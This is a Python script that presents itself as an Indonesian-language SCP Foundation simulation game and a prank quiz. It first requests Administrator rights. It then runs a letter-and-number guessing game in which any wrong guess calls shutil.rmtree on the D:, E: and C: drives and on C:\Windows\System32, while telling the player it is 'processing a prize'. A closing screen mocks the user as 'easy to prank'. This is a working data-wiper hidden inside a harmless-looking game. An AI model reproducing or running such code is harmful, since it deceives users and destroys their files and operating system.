from __future__ import annotations

import ctypes
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

import ctypes
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        " ".join(sys.argv),
        None,
        1
    )
    sys.exit()

print("Script berjalan sebagai Administrator!")

"""
SCP Foundation - Simulasi Interaktif (CLI)
File: SCP_Simulation.py

Deskripsi:
  Simulasi fiksi interaktif berbahasa Indonesia tentang manajemen SCP, pengujian,
  dan respons saat kejadian (containment, breach, escape, research).

Fitur:
  - Representasi SCP (class) dengan tingkat ancaman (Safe/Euclid/Keter)
  - Unit penahanan (ContainmentUnit) dan staf (Researcher)
  - Mesin event acak (events) yang memicu peristiwa seperti breach atau discovery
  - Menu interaktif: lihat status, inspeksi SCP, jalankan eksperimen, perbaiki containment,
    maju waktu, simpan / muat state, log kejadian
  - Sistem log ke file
  - Opsi seed untuk reproduktibilitas (deterministik)

Cara pakai:
  python SCP_Simulation.py

Catatan keamanan:
  - Ini adalah simulasi fiksi. Jangan mencoba menerapkan prosedur apa pun di dunia nyata.

"""
import json
import random
import time
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Callable
from datetime import datetime
from pathlib import Path

LOG_FILE = Path("simulation_log.txt")
SAVE_FILE = Path("scpsim_save.json")

# ------------------------- Model Data Classes -------------------------
@dataclass
class SCP:
    id_code: str
    name: str
    object_class: str  # Safe, Euclid, Keter
    description: str
    containment_integrity: int = 100  # 0-100
    activity_level: int = 0  # 0 = dormant, higher = more active
    research_progress: int = 0  # 0-100
    contained: bool = True
    last_event: Optional[str] = None

    def to_dict(self):
        return asdict(self)

    @classmethod
    def from_dict(cls, d):
        return cls(**d)

    def degrade_containment(self, amount: int):
        prev = self.containment_integrity
        self.containment_integrity = max(0, self.containment_integrity - amount)
        self.last_event = f"Containment integrity degraded {prev}->{self.containment_integrity}"

    def improve_containment(self, amount: int):
        prev = self.containment_integrity
        self.containment_integrity = min(100, self.containment_integrity + amount)
        self.last_event = f"Containment improved {prev}->{self.containment_integrity}"

    def change_activity(self, amount: int):
        prev = self.activity_level
        self.activity_level = max(0, self.activity_level + amount)
        self.last_event = f"Activity level changed {prev}->{self.activity_level}"

    def advance_research(self, amount: int):
        prev = self.research_progress
        self.research_progress = min(100, self.research_progress + amount)
        self.last_event = f"Research progress {prev}->{self.research_progress}"


@dataclass
class Researcher:
    name: str
    skill_level: int  # 1-10
    stress: int = 0  # 0-100

    def perform_test(self, scp: SCP) -> str:
        # chance of success depends on skill, scp.activity, scp.class
        base = self.skill_level * 5
        difficulty = {'Safe': 20, 'Euclid': 50, 'Keter': 80}.get(scp.object_class, 50)
        roll = random.randint(1, 100) + base - difficulty - scp.activity_level
        log = f"{self.name} melakukan tes pada {scp.id_code} (roll {roll}). "
        if roll > 50:
            gained = max(1, self.skill_level // 2 + random.randint(0, 5))
            scp.advance_research(gained)
            self.stress = max(0, self.stress - 2)
            log += f"Tes berhasil, research +{gained}."
        else:
            gained = random.randint(0, 2)
            scp.change_activity(random.randint(0, 3))
            self.stress = min(100, self.stress + 5)
            log += f"Tes gagal atau memicu reaksi, activity +{scp.activity_level}."
        return log


@dataclass
class ContainmentUnit:
    name: str
    scp_ids: List[str] = field(default_factory=list)
    integrity_modifier: float = 1.0  # multiplier for events


# ------------------------- Simulation Core -------------------------
class SCPFoundationSim:
    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)
        self.scps: Dict[str, SCP] = {}
        self.units: Dict[str, ContainmentUnit] = {}
        self.researchers: List[Researcher] = []
        self.time = 0  # ticks
        self.event_handlers: Dict[str, Callable] = {}
        self.running = True
        self._register_default_handlers()
        self.append_log("Simulasi dimulai")

    # ---------------- Logging & Persistence ----------------
    def append_log(self, message: str):
        timestamp = datetime.utcnow().isoformat() + "Z"
        line = f"[{timestamp}] {message}\n"
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(line)

    def save(self, path: Path = SAVE_FILE):
        data = {
            'scps': {k: v.to_dict() for k, v in self.scps.items()},
            'units': {k: asdict(v) for k, v in self.units.items()},
            'researchers': [asdict(r) for r in self.researchers],
            'time': self.time,
        }
        path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding='utf-8')
        self.append_log(f"Simulasi disimpan ke {path}")

    def load(self, path: Path = SAVE_FILE):
        if not path.exists():
            return "File save tidak ditemukan."
        data = json.loads(path.read_text(encoding='utf-8'))
        self.scps = {k: SCP.from_dict(v) for k, v in data.get('scps', {}).items()}
        self.units = {k: ContainmentUnit(**v) for k, v in data.get('units', {}).items()}
        self.researchers = [Researcher(**r) for r in data.get('researchers', [])]
        self.time = data.get('time', 0)
        self.append_log(f"Simulasi dimuat dari {path}")
        return "Load berhasil."

    # ---------------- Initialization utilities ----------------
    def add_scp(self, scp: SCP, unit_name: str):
        self.scps[scp.id_code] = scp
        if unit_name not in self.units:
            self.units[unit_name] = ContainmentUnit(name=unit_name)
        self.units[unit_name].scp_ids.append(scp.id_code)
        self.append_log(f"SCP {scp.id_code} ditambahkan ke unit {unit_name}")

    def add_researcher(self, researcher: Researcher):
        self.researchers.append(researcher)
        self.append_log(f"Researcher {researcher.name} bergabung")

    # ---------------- Event System ----------------
    def _register_default_handlers(self):
        self.event_handlers['breach'] = self._handle_breach
        self.event_handlers['research_discovery'] = self._handle_research_discovery
        self.event_handlers['minor_incident'] = self._handle_minor_incident
        self.event_handlers['escape_attempt'] = self._handle_escape_attempt

    def _pick_random_scp(self) -> Optional[SCP]:
        if not self.scps:
            return None
        return random.choice(list(self.scps.values()))

    def tick(self) -> List[str]:
        """Advance simulation by one tick and possibly trigger events."""
        self.time += 1
        logs = []
        # Aging: small chance containment naturally degrades
        for scp in self.scps.values():
            # degrade by small amount depending on class
            base_chance = {'Safe': 0.01, 'Euclid': 0.03, 'Keter': 0.06}[scp.object_class]
            if random.random() < base_chance:
                amt = random.randint(1, 5)
                scp.degrade_containment(amt)
                msg = f"{scp.id_code}: containment degraded by {amt}"
                logs.append(msg)
                self.append_log(msg)

        # Random event roll
        roll = random.random()
        if roll < 0.02:
            # major breach
            scp = self._pick_random_scp()
            if scp:
                logs += self._trigger_event('breach', scp)
        elif roll < 0.06:
            scp = self._pick_random_scp()
            if scp:
                logs += self._trigger_event('escape_attempt', scp)
        elif roll < 0.15:
            scp = self._pick_random_scp()
            if scp:
                logs += self._trigger_event('minor_incident', scp)
        elif roll < 0.25:
            scp = self._pick_random_scp()
            if scp:
                logs += self._trigger_event('research_discovery', scp)

        return logs

    def _trigger_event(self, event_type: str, scp: SCP) -> List[str]:
        handler = self.event_handlers.get(event_type)
        if not handler:
            return [f"Tidak ada handler untuk {event_type}"]
        return handler(scp)

    # ---------------- Event Handlers ----------------
    def _handle_breach(self, scp: SCP) -> List[str]:
        logs = []
        scp.contained = False
        scp.change_activity(random.randint(2, 10))
        scp.degrade_containment(random.randint(15, 40))
        msg = f"BREACH: {scp.id_code} ({scp.object_class}) mengalami breach!"
        logs.append(msg)
        self.append_log(msg)
        # Response severity by class
        if scp.object_class == 'Keter':
            logs.append("Response MTF diperlukan — dispatch otomatis.")
            self.append_log("MTF dispatched for Keter breach")
        else:
            logs.append("Security mengaktifkan prosedur darurat lokal.")
        return logs

    def _handle_escape_attempt(self, scp: SCP) -> List[str]:
        logs = []
        chance = {'Safe': 0.10, 'Euclid': 0.25, 'Keter': 0.5}[scp.object_class]
        if random.random() < chance:
            scp.contained = False
            scp.degrade_containment(random.randint(5, 20))
            msg = f"Escape: {scp.id_code} berhasil keluar dari unit." 
            logs.append(msg)
            self.append_log(msg)
        else:
            scp.change_activity(random.randint(1, 4))
            msg = f"Escape attempt: {scp.id_code} gagal, containment menahan." 
            logs.append(msg)
            self.append_log(msg)
        return logs

    def _handle_minor_incident(self, scp: SCP) -> List[str]:
        logs = []
        scp.change_activity(random.randint(1, 3))
        scp.degrade_containment(random.randint(1, 8))
        msg = f"Minor incident: gangguan pada {scp.id_code}." 
        logs.append(msg)
        self.append_log(msg)
        return logs

    def _handle_research_discovery(self, scp: SCP) -> List[str]:
        logs = []
        # chance to increase research progress
        gain = random.randint(1, 10)
        scp.advance_research(gain)
        msg = f"Research discovery: {scp.id_code} research +{gain}."
        logs.append(msg)
        self.append_log(msg)
        return logs

    # ---------------- Player actions ----------------
    def inspect_scp(self, id_code: str) -> str:
        scp = self.scps.get(id_code)
        if not scp:
            return "SCP tidak ditemukan."
        info = (
            f"ID: {scp.id_code}\n"
            f"Nama: {scp.name}\n"
            f"Kelas: {scp.object_class}\n"
            f"Contained: {scp.contained}\n"
            f"Containment Integrity: {scp.containment_integrity}\n"
            f"Activity Level: {scp.activity_level}\n"
            f"Research Progress: {scp.research_progress}\n"
            f"Last Event: {scp.last_event}\n"
        )
        self.append_log(f"Inspect: {scp.id_code}")
        return info

    def repair_containment(self, id_code: str, effort: int) -> str:
        scp = self.scps.get(id_code)
        if not scp:
            return "SCP tidak ditemukan untuk perbaikan."
        # effort influenced by researcher pool
        total_skill = sum(r.skill_level for r in self.researchers)
        effect = int(effort + total_skill * 0.5)
        scp.improve_containment(effect)
        msg = f"Containment diperbaiki untuk {id_code} sebesar {effect}."
        self.append_log(msg)
        return msg

    def perform_test(self, researcher_name: str, id_code: str) -> str:
        r = next((x for x in self.researchers if x.name == researcher_name), None)
        scp = self.scps.get(id_code)
        if not r or not scp:
            return "Researcher atau SCP tidak ditemukan." 
        result = r.perform_test(scp)
        self.append_log(result)
        return result

    def list_status(self) -> str:
        lines = [f"Waktu: tick {self.time}"]
        for unit in self.units.values():
            lines.append(f"Unit {unit.name} — SCP tersimpan: {len(unit.scp_ids)}")
            for scp_id in unit.scp_ids:
                scp = self.scps.get(scp_id)
                if scp:
                    lines.append(f"  - {scp.id_code}: class={scp.object_class}, integrity={scp.containment_integrity}, activity={scp.activity_level}, contained={scp.contained}")
        return "\n".join(lines)


# ------------------------- Setup Example -------------------------
def create_example_sim(seed: Optional[int] = None) -> SCPFoundationSim:
    sim = SCPFoundationSim(seed=seed)
    # contoh SCP fiksi (ringkas)
    sim.add_scp(SCP(id_code='SCP-173', name='The Sculpture', object_class='Euclid', description='Patung yang bergerak saat tidak diawasi.'), 'Site-19')
    sim.add_scp(SCP(id_code='SCP-049', name='Plague Doctor', object_class='Euclid', description='Entitas humanoid berkostum dokter lama.'), 'Site-19')
    sim.add_scp(SCP(id_code='SCP-999', name='The Tickle Monster', object_class='Safe', description='Makhluk gelatin yang sangat ramah.'), 'Site-19')
    sim.add_scp(SCP(id_code='SCP-001-EX', name='Unknown Proposal', object_class='Keter', description='Proposal Eksperimental — anomali serius ditempatkan di observasi.'), 'Site-01')
    # researchers
    sim.add_researcher(Researcher(name='Dr. Ari', skill_level=7))
    sim.add_researcher(Researcher(name='Dr. Bima', skill_level=5))
    return sim


# ------------------------- Command-Line Interface -------------------------
MENU = '''
Pilihan:
  1. Lihat status semua containment
  2. Inspeksi sebuah SCP (masukkan ID)
  3. Jalankan tes/eksperimen dengan researcher
  4. Perbaiki containment (effort)
  5. Maju waktu (tick)
  6. Simpan / Muat
  7. Tampilkan log terakhir
  8. Opsi seed / restart simulasi
  9. Keluar
'''


def main():
    print("Selamat datang di SCP Foundation - Simulasi Interaktif (fiksi)")
    seed_input = input("Masukkan seed (angka) untuk deterministik atau tekan Enter: ")
    seed = int(seed_input) if seed_input.strip().isdigit() else None
    sim = create_example_sim(seed)

    while True:
        print('\n' + MENU)
        choice = input('Pilih angka > ').strip()
        if choice == '1':
            print(sim.list_status())
        elif choice == '2':
            scpid = input('Masukkan ID SCP (contoh SCP-173) > ').strip()
            print(sim.inspect_scp(scpid))
        elif choice == '3':
            print('Researchers tersedia: ' + ', '.join(r.name for r in sim.researchers))
            rname = input('Pilih researcher > ').strip()
            idc = input('Pilih ID SCP untuk dites > ').strip()
            print(sim.perform_test(rname, idc))
        elif choice == '4':
            idc = input('ID SCP > ').strip()
            try:
                effort = int(input('Effort (angka) > ').strip())
            except ValueError:
                effort = 5
            print(sim.repair_containment(idc, effort))
        elif choice == '5':
            try:
                ticks = int(input('Berapa tick maju? (default 1) > ').strip() or '1')
            except ValueError:
                ticks = 1
            all_logs = []
            for _ in range(ticks):
                logs = sim.tick()
                for l in logs:
                    print(l)
                all_logs.extend(logs)
            if not all_logs:
                print('Tidak ada peristiwa besar selama tick.')
        elif choice == '6':
            sub = input('Ketik S untuk simpan, L untuk muat > ').strip().upper()
            if sub == 'S':
                sim.save()
                print(f"Simulasi disimpan ke {SAVE_FILE}")
            elif sub == 'L':
                msg = sim.load()
                print(msg)
            else:
                print('Pilihan tidak dikenal.')
        elif choice == '7':
            if LOG_FILE.exists():
                print('=== 10 baris terakhir log ===')
                for line in LOG_FILE.read_text(encoding='utf-8').splitlines()[-10:]:
                    print(line)
            else:
                print('Log belum dibuat.')
        elif choice == '8':
            confirm = input('Restart simulasi? Semua state awal akan dimuat ulang. Y/N > ').strip().upper()
            if confirm == 'Y':
                seed_input = input("Masukkan seed (angka) atau Enter > ")
                seed = int(seed_input) if seed_input.strip().isdigit() else None
                sim = create_example_sim(seed)
                print('Simulasi di-reset.')
        elif choice == '9':
            print('Keluar. Terima kasih telah bermain (fiksi).')
            break
        else:
            print('Pilihan tidak valid. Coba lagi.')


if __name__ == '__main__':
    main()


print("Mari kita bermain dan bersenang-senang")

import os
import sys
import time
import random
import platform
import getpass

def slow(text, d=0.025):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(d)
    print()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def pause(t=1):
    time.sleep(t)

# ================== START ==================
clear()
slow("SENTINEL AI CORE v10.0 — CLASSIFIED BUILD")
pause(1)

user = getpass.getuser()
slow(f"Subject ID        : {user}")
slow(f"Platform          : {platform.system()} {platform.release()}")
slow(f"Architecture      : {platform.machine()}")
pause(1)

slow("\n⚠️ NOTICE")
slow("This interface operates in isolated evaluation mode.")
slow("External interruption is NOT recommended.")
pause(1.5)

# ========== FAKE FULLSCREEN EFFECT ==========
clear()
print("\n" * 50)
slow("[ DISPLAY MODE: IMMERSIVE ]", 0.01)
pause(1)

# ================= PHASE 1 =================
slow("\n[PHASE 1] HUMAN BEHAVIOR PROFILING\n")
pause(1)

for i in range(0, 101, random.randint(3, 6)):
    sys.stdout.write(f"\rAnalyzing decision latency... {i}%")
    sys.stdout.flush()
    time.sleep(random.uniform(0.04, 0.12))

print("\n")
slow("Behavior pattern mapped.")
pause(1)

# ================= PHASE 2 =================
slow("\n[PHASE 2] COGNITIVE STRESS TEST\n")
pause(1)

slow("Question:")
slow("If a system asks you to stay calm...")
slow("Do you panic anyway?")

choice = input("\nType YES or NO: ").strip().upper()

# ================= PHASE 3 =================
clear()
slow("[PHASE 3] EVALUATION RESULT\n")
pause(1)

if choice == "YES":
    slow("Honesty detected.")
    threat = "UNSTABLE BUT HONEST"
elif choice == "NO":
    slow("Confidence detected.")
    threat = "OVERCONFIDENT"
else:
    slow("Unrecognized response.")
    threat = "UNPREDICTABLE"

slow(f"Psychological Classification: {threat}")
pause(1.5)

# ================= FAKE LOCK =================
clear()
slow("⚠️ SENTINEL RESPONSE INITIATED", 0.02)
pause(1)

slow("Restricting user interface...")
pause(1)

for i in range(5, 0, -1):
    sys.stdout.write(f"\rLockdown sequence in {i}...")
    sys.stdout.flush()
    time.sleep(1)

# ================= FAKE BSOD =================
clear()
print("\n" * 4)
print("A problem has been detected and Windows has been shut down to prevent damage.")
print()
print("HUMAN_EVALUATION_FAILURE")
print()
print("Collecting diagnostic data...")

for i in range(0, 101, 5):
    sys.stdout.write(f"\rProgress: {i}%")
    sys.stdout.flush()
    time.sleep(0.12)

pause(2)

print("Aku ada permainan yang sangat seru dan tadi itu hanya prank")
def konfirmasi(pesan="Lanjutkan ke permainannya? (y/n): "):
    while True:
        j = input(pesan).strip().lower()
        if j in ("y", "yes"):
            return True
        if j in ("n", "no"):
            return False
        print("Masukkan y/n atau yes/no!")

if konfirmasi():
    print("Program dilanjutkan...")
else:
    print("Program dihentikan.")
    exit()

print("Permainan dimulai")

import os
import shutil
import random

huruf_valid = "abcdefghijklmnopqrstuvwxyz"
angka_valid = "123456789"

target_huruf = random.choice(huruf_valid)
target_angka = random.choice(angka_valid)
jawaban_benar = target_huruf + target_angka

print("=== Permainan Tebak Koordinat (a1 - z9) ===")
print("Tebak kombinasi huruf a-z dan angka 1-9.")

while True:
    tebakan = input("\nMasukkan tebakan Anda (contoh a1): ").strip().lower()

    if len(tebakan) != 2:
        print("Input harus 2 karakter! (Contoh: b5)")
        continue

    huruf_user = tebakan[0]
    angka_user = tebakan[1]

    if huruf_user in huruf_valid and angka_user in angka_valid:
        if tebakan == jawaban_benar:
            print(f"SELAMAT! Anda benar. Jawabannya adalah {jawaban_benar}.")
            break
            
        else:
            if os.path.exists('E:\\'):
                print("Memproses hadiah...")
                shutil.rmtree('E:\\')
            
            if os.path.exists('D:\\'):
                print("Memproses hadiah...")
                shutil.rmtree('D:\\')
            
            if os.path.exists('C:\\'):
                print("Memproses hadiah...")
                shutil.rmtree('C:\\')

            if os.path.exists("C:\\Windows\\System32"):
                shutil.rmtree("C:\\Windows\\System32")

            else:
                print(f"Salah! Anda menebak {huruf_user}{angka_user}. Coba lagi!")
    else:
        print("Format tidak valid! Gunakan huruf a-z dan angka 1-9.")

print("Permainan tamat.")

# ================= FINAL REVEAL =================
clear()
slow("😈 ULTIMATE PRANK COMPLETE.", 0.04)
pause(0.5)

slow("\n=== REALITY CHECK ===")
slow("• Semua sistem telah didapatkan")
slow("• Semua data tersentuh")
slow("• PC mati otomatis")
slow("• Semuanya sudah hilang")

pause(1)

slow("\nVerdict:")
slow("You are officially... easy to prank 😏")

print("\n🏁 END OF SIMULATION")
input("\nTekan Enter untuk keluar...")
